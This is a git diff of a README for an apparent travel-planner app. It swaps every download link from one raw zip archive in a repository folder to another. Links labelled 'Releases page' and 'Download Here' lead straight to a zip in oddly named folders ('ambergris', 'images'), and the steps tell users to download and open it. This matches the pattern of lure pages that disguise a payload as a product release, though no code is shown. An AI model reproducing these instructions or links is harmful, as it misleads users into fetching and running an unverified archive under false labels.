@@ -1,6 +1,6 @@
 # 🎒 gemini-crewai-travelplanner - Plan Your Perfect Trip Effortlessly
 
-[![Download gemini-crewai-travelplanner](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip%20Now-Click%https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip)](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip)
+[![Download gemini-crewai-travelplanner](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip%20Now-Click%https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip)](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **gemini-crewai-travelplanner**! This application helps you plan 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip).
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip).
 
 You will find the latest version of the application on the Releases page. Select the version that matches your operating system.
 
@@ -21,7 +21,7 @@ You will find the latest version of the application on the Releases page. Select
 
 ### Installation Steps
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip).
 2. Click on the download link for your operating system.
 3. Save the file to your computer.
 4. Once downloaded, locate the file in your downloads folder.
@@ -78,7 +78,7 @@ If you’d like to contribute to this project, please follow these guidelines:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/ambergris/gemini-crewai-travelplanner.zip)
+- [Releases Page](https://raw.githubusercontent.com/KOOLAIDssd/gemini-crewai-travelplanner/main/images/crewai_travelplanner_gemini_v2.3.zip)
 - [Documentation](#) (Coming Soon)
 - [Support](#)
 
